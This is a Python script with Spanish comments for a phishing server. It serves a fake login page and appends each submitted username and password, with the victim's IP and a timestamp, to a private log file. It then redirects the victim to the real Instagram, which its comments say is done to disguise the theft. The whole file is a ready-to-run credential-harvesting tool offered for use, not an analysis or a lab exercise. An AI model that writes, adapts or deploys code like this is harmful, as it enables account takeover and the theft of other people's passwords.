from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os

class AndyTechnologyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # Servir el archivo index.html corregido
        if self.path == '/':
            try:
                with open("index.html", "rb") as f:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_error(404, "Error: No se encontro el archivo index.html en esta carpeta.")
        else:
            # Para evitar errores con favicon u otros archivos
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # 1. Leer el tamaño de los datos recibidos
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # 2. Parsear los datos del formulario (user_id y user_pass)
        datos = urllib.parse.parse_qs(post_data)
        usuario = datos.get('user_id', ['Desconocido'])[0]
        password = datos.get('user_pass', ['Desconocido'])[0]
        
        # 3. Obtener info adicional
        fecha = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        ip_cliente = self.client_address[0]

        # 4. Crear el reporte para el archivo
        reporte = (
            f"====================================\n"
            f"SISTEMAS ANDY TECHNOLOGY - CAPTURA\n"
            f"Fecha: {fecha}\n"
            f"IP: {ip_cliente}\n"
            f"Usuario: {usuario}\n"
            f"Password: {password}\n"
            f"====================================\n\n"
        )

        # 5. Guardar en registro_privado.txt (Modo 'a' para no borrar lo anterior)
        try:
            with open("registro_privado.txt", "a") as f:
                f.write(reporte)
            
            # Mensaje visual en la terminal de Termux
            print(f"\033[92m[+] ¡EXITO! Datos recibidos de: {usuario}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error al escribir archivo: {e}\033[0m")

        # 6. Redirigir al usuario al Instagram real para disimular
        self.send_response(301)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()

# --- Configuración de inicio ---
def iniciar_servidor():
    puerto = 8080
    direccion = '0.0.0.0' # Escucha en todas las interfaces
    servidor = HTTPServer((direccion, puerto), AndyTechnologyServer)
    
    print("-" * 40)
    print(f"   ANDY TECHNOLOGY - SERVIDOR ACTIVO")
    print("-" * 40)
    print(f"[*] Corriendo en: http://localhost:{puerto}")
    print(f"[*] Archivo de log: registro_privado.txt")
    print(f"[*] Esperando conexiones de red...")
    print("-" * 40)
    
    try:
        servidor.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Servidor detenido por el usuario.")
        servidor.server_close()

if __name__ == "__main__":
    iniciar_servidor()
